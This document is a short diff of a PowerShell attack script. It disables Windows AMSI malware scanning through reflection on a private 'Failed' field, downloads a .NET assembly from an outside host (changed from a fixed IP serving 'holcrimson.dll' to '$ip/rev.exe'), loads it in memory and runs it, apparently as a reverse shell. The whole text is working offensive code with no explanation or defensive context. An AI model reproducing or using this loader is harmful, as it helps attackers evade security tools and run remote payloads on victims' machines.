@@ -3,8 +3,6 @@ ForEach($b in $a) {if ($b.Name -like '*iUtils') {$c = $b}}
 $d = $c.GetFields('NonPublic,Static')
 ForEach($e in $d) {if ($e.Name -like '*Failed') {$f = $e}}
 $f.SetValue($null,$true)
-$data = (New-Object System.Net.WebClient).DownloadData('http://172.19.171.250/holcrimson.dll')
+$data = (New-Object System.Net.WebClient).DownloadData('http://$ip/rev.exe')
 $assem = [System.Reflection.Assembly]::Load($data)
-$class = $assem.GetType('holcrimson.Program')
-$method = $class.GetMethod('Run')
-$method.Invoke(0, $null)
+[rev.Program]::Main("".Split())
